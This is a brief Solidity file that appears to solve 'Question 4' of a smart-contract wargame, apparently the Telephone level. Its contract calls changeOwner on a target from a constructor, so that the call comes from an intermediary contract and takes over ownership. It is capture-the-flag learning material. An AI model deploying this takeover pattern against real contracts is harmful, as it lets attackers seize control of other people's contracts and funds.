// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Question 4
interface Telephone {
    function changeOwner(address _owner) external;
}

contract Solution4 {
    constructor(address _target, address _owner) {
        Telephone(_target).changeOwner(_owner);
    }
}
